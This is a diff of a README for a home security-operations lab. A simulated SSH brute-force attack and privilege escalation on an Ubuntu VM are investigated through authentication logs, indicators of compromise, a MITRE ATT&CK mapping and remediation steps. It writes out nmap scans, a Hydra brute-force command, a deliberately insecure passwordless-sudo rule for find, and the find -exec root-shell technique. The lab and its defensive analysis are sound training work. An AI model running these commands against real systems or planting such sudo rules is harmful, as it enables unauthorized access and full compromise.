@@ -1,175 +1,187 @@
-# Home-SOC-Lab---Simulated-Intrusion-Privilege-Escalation-Investigation
+# Home SOC Lab - Simulated Intrusion & Privilege Escalation Investigation
 
-## Overview
-This project documents a simulated intrusion conducted in a home cybersecurity lab using **Kali Linux as the attacker and Ubuntu as the target system.**
+A hands-on cybersecurity lab simulating a realistic SSH brute-force intrusion and privilege escalation scenario, analyzed from a SOC analyst perspective using Linux authentication logs and forensic investigation techniques.
 
-The goal of this lab was to simulate a realistic attack lifecycle and analyze it from a SOC analyst perspective, focusing on:
-- Detecting brute-force authentication attempts
-- Investigating suspicious login activity
-- Analyzing Linux authentication logs
-- Identifying privilege escalation behavior
-- Extracting Indicators of Compromise (IoCs)
-
-All attack activity was intentionally generated in a controlled environment and analyzed using system logs.
+---
 
 ## Lab Environment
-**Target System**
-- Ubuntu Virtual Machine
-**Attacker System**
-- Kali Linux Virtual Machine 
-**Network**
-- Isolated virtual lab environment
-**Key Tools Used**
-- Nmap
-- Hydra
-- SSH
-- Linux log analysis tools (grep, last, who)
-**Logs analyzed:**
-- /var/log/auth.log
-- /var/log/syslog
+
+| Component | Details |
+|---|---|
+| Attacker | Kali Linux (Virtual Machine) |
+| Target | Ubuntu (Virtual Machine) |
+| Network | Isolated virtual lab environment |
+| Logs Analyzed | `/var/log/auth.log`, `/var/log/syslog` |
+
+**Tools Used:** Nmap · Hydra · SSH · grep · last · who
+
+---
 
 ## Attack Simulation Workflow
-The simulated intrusion followed a typical attack lifecycle.
-**1. Reconnaissance**
-The attacker performed network reconnaissance to identify exposed services.
 
-Example scans: </br>
-   nmap -sS 192.168.x.x </br>
-   nmap -sV 192.168.x.x </br>
-   nmap -A 192.168.x.x <br>
-   nmap -p- 192.168.x.x
-   
+### 1. Reconnaissance
+
+Network reconnaissance was performed to identify exposed services on the target.
+
+```bash
+nmap -sS 192.168.x.x
+nmap -sV 192.168.x.x
+nmap -A 192.168.x.x
+nmap -p- 192.168.x.x
+```
+
 **Findings:**
 - Only port 22 (SSH) was open
 - SSH service version identified
 - Target OS fingerprinted as Linux
-- Minimal attack surface observed
-This confirmed the environment was a clean lab system with limited exposed services.
+- Minimal attack surface confirmed
 
-## 2. SSH Brute-Force Simulation
-Brute-force login attempts were generated to simulate unauthorized access attempts.
+---
 
-Example commands: </br>
-ssh testuser@192.168.x.x
+### 2. SSH Brute-Force Simulation
 
-Automated attempts: </br>
+Automated brute-force login attempts were generated to simulate unauthorized access.
+
+```bash
 hydra -l testuser -P passlist.txt ssh://192.168.x.x
+```
 
-Observed behavior:
-- Repeated failed login attempts
-- Authentication failures recorded in system logs
-- Pattern consistent with automated login attempts
+**Observed behavior:**
+- Repeated failed login attempts recorded in system logs
+- Pattern consistent with scripted automated login attempts
 
-## Log Analysis
-Authentication logs were analyzed to detect suspicious activity.
+---
 
-Examples: </br>
-sudo grep "Failed password" /var/log/auth.log </br>
-sudo grep "Invalid user" /var/log/auth.log </br>
-sudo grep "Accepted password" /var/log/auth.log </br>
+### 3. Log Analysis
+
+Authentication logs were examined to surface suspicious activity and extract attack indicators.
+
+```bash
+sudo grep "Failed password" /var/log/auth.log
+sudo grep "Invalid user" /var/log/auth.log
+sudo grep "Accepted password" /var/log/auth.log
 sudo grep sshd /var/log/auth.log
+```
 
-Indicators observed: </br>
-- Multiple failed authentication attempts
+**Indicators observed:**
+- Multiple failed authentication attempts from the same IP
 - Invalid user login attempts
-- Successful login events
-- Repeated connections from the same IP address
+- Successful login event following brute-force activity
 
-These patterns clearly demonstrate brute-force attack activity.
+![Failed Password Entries](Failed%20Pswd%20Entries.png)
 
-## 4. Session Investigation
-User activity and sessions were reviewed using: </br>
-       last </br>
-       who </br>
-These commands helped verify:
-- Active login sessions
-- Historical login attempts
-- Potential unauthorized access
-## 5. Privilege Escalation Simulation
-A controlled misconfiguration was introduced to simulate a privilege escalation vulnerability.
+![Grep Results](grep%20results.png)
 
-The user testuser was granted passwordless sudo access to the find binary.
+---
 
-Sudo configuration: </br>
-   testuser ALL=(ALL) NOPASSWD: /usr/bin/find 
+### 4. Session Investigation
 
-This allowed execution of root commands via the -exec option.
+Active and historical sessions were reviewed to verify unauthorized access.
 
-Exploitation: </br>
-   sudo -l </br>
-   sudo find . -exec /bin/bash \; -quit </br>
-   whoami
+```bash
+last
+who
+```
 
-Result: </br>
-   root </br>
-This confirmed **successful privilege escalation.**
+---
 
-## Log Evidence of Escalation
-Escalation activity was visible in authentication logs.
+### 5. Privilege Escalation Simulation
 
-Example detection: </br>
-sudo grep sudo /var/log/auth.log
+A controlled sudo misconfiguration was introduced to simulate a privilege escalation vulnerability. The user `testuser` was granted passwordless sudo access to the `find` binary.
 
-Example log entry: </br>
-sudo: </br>
-testuser : COMMAND=/usr/bin/find </br>
-
-This provides a clear **Indicator of Compromise** for escalation activity.
-
-## Indicators of Compromise (IoCs)
-| IoC Type                 | Example                                  | Description                     |
-|--------------------------|------------------------------------------|---------------------------------|
-| Suspicious IP            | 192.168.x.x                              | Source of repeated SSH attempts |
-| Failed Logins            | Failed password for testuser             | Brute-force attempt             |
-| Authentication Failures  | pam_unix(sshd:auth)                      | Repeated login failures         |
-| Privilege Escalation     | sudo: testuser : COMMAND=/usr/bin/find   | Misconfigured sudo execution    |
-| Automated Login Behavior | Multiple attempts per second             | Scripted brute-force activity   |
-
-## Mitigation Strategies
-Security improvements to prevent this attack scenario include:
-- Enforce strong password policies
-- Implement multi-factor authentication for SSH
-- Follow the least privilege principle
-- Monitor authentication logs for abnormal patterns
-- Restrict SSH access to trusted IP addresses
-- Regularly audit sudoers configurations
-
-## Remediation Actions
-**Containment**
-- Block suspicious IP addresses
-- Lock affected user accounts
-**Eradication**
-Remove insecure sudo configuration: </br>
-sudo visudo
-
-Remove:</br>
+```bash
+# Sudo misconfiguration
 testuser ALL=(ALL) NOPASSWD: /usr/bin/find
 
-Verify: </br>
+# Exploitation via GTFOBins technique
 sudo -l
-**Recovery**
--Reset user credentials
--Review running processes
-- Audit system configurations
+sudo find . -exec /bin/bash \; -quit
+whoami
+# Result: root
+```
 
-## Key Skills Demonstrated
-This project demonstrates practical experience in:
-- SOC investigation workflows
-- Linux log analysis
-- Brute-force attack detection
-- Privilege escalation analysis
-- Indicator of Compromise identification
-- Incident response documentation
+**Outcome:** Successful privilege escalation to root confirmed.
+
+![Escalation Result](escalation%20result.png)
+
+---
+
+### 6. Log Evidence of Escalation
+
+Escalation activity was detected in authentication logs.
+
+```bash
+sudo grep sudo /var/log/auth.log
+# sudo: testuser : COMMAND=/usr/bin/find
+```
+
+---
+
+## Indicators of Compromise (IoCs)
+
+| IoC Type | Example | Description |
+|---|---|---|
+| Suspicious IP | 192.168.x.x | Source of repeated SSH attempts |
+| Failed Logins | `Failed password for testuser` | Brute-force attempt pattern |
+| Auth Failures | `pam_unix(sshd:auth)` | Repeated login failures |
+| Privilege Escalation | `sudo: testuser : COMMAND=/usr/bin/find` | Misconfigured sudo execution |
+| Automated Behavior | Multiple attempts per second | Scripted brute-force activity |
+
+---
+
+## MITRE ATT&CK Mapping
+
+| Technique | ID | Description |
+|---|---|---|
+| Brute Force | T1110 | SSH credential brute-forcing via Hydra |
+| Valid Accounts | T1078 | Successful login after brute-force |
+| Sudo and Sudo Caching | T1548.003 | Privilege escalation via sudo misconfiguration |
+| Unix Shell | T1059.004 | Shell spawned via find -exec |
+
+---
+
+## Remediation Actions
+
+**Containment**
+- Block the suspicious source IP
+- Lock the compromised user account
+
+**Eradication**
+```bash
+sudo visudo
+# Remove: testuser ALL=(ALL) NOPASSWD: /usr/bin/find
+sudo -l  # Verify removal
+```
+
+**Recovery**
+- Reset user credentials
+- Review running processes for persistence
+- Audit all sudoers configurations
+
+**Hardening Recommendations**
+- Enforce strong password policies
+- Implement MFA for SSH access
+- Apply least privilege across all accounts
+- Monitor auth logs for anomalous patterns
+- Restrict SSH access to trusted IPs only
+
+---
 
 ## Key Takeaway
-This lab highlights how simple configuration mistakes combined with weak monitoring can allow attackers to move from initial access to full system compromise.
 
-Effective log monitoring, proper privilege management, and strong authentication controls are essential to detect and prevent these attacks.
+Simple configuration mistakes combined with weak monitoring can allow attackers to move from initial access to full system compromise. This lab demonstrates how effective log monitoring, proper privilege management, and strong authentication controls are essential to detect and prevent these attack patterns.
 
-## Note
-All analysis was performed in a controlled home lab environment. Sensitive information such as real IP addresses has been sanitized.
+---
 
-## Author
+## Skills Demonstrated
 
-Durga Sai Sri Ramireddy  
-Master's in Cybersecurity
+`SOC Investigation` `Linux Log Analysis` `Brute-Force Detection` `Privilege Escalation Analysis` `IOC Identification` `Incident Response` `MITRE ATT&CK Mapping`
+
+---
+
+> All analysis was performed in a controlled home lab environment. Sensitive information such as real IP addresses has been sanitized.
+
+**Author:** Durga Sai Sri Ramireddy | MS Cybersecurity, University of Houston  
+[![LinkedIn](https://img.shields.io/badge/-LinkedIn-0072b1?style=flat&logo=linkedin&logoColor=white)](https://linkedin.com/in/durgaramireddy)
+[![GitHub](https://img.shields.io/badge/-GitHub-181717?style=flat&logo=github&logoColor=white)](https://github.com/DurgaRamireddy)
+
